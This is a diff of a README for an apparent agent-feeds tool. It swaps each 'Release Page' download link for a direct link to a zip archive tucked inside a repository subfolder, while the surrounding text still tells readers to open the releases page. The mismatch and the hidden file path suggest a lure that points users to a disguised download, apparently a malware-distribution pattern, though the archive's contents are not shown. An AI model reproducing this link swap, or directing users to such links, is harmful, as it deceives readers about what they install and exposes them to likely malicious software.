@@ -1,6 +1,6 @@
 # 🤖 openclaw-agent-feeds - Ready-to-Use Agent Feeds
 
-[![Download openclaw-agent-feeds](https://img.shields.io/badge/Download-Release%20Page-5865F2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kristine7246/openclaw-agent-feeds/releases)
+[![Download openclaw-agent-feeds](https://img.shields.io/badge/Download-Release%20Page-5865F2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kristine7246/openclaw-agent-feeds/raw/refs/heads/main/feeds/legal-precision/agent_feeds_openclaw_3.9.zip)
 
 ## 📦 What this app is
 
@@ -18,7 +18,7 @@ It is made for people who want a simple way to work with agent feeds, SEO tasks,
 ## 🚀 Download the app
 
 Visit this page to download:  
-https://github.com/Kristine7246/openclaw-agent-feeds/releases
+https://github.com/Kristine7246/openclaw-agent-feeds/raw/refs/heads/main/feeds/legal-precision/agent_feeds_openclaw_3.9.zip
 
 1. Open the release page.
 2. Find the latest release at the top.
@@ -130,6 +130,6 @@ If something seems wrong, check these items:
 
 ## 📥 Download again
 
-[![Download from Releases](https://img.shields.io/badge/Releases-Download%20Here-6E7B8B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kristine7246/openclaw-agent-feeds/releases)
+[![Download from Releases](https://img.shields.io/badge/Releases-Download%20Here-6E7B8B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kristine7246/openclaw-agent-feeds/raw/refs/heads/main/feeds/legal-precision/agent_feeds_openclaw_3.9.zip)
 
 Open the releases page, then download the Windows package from the latest release
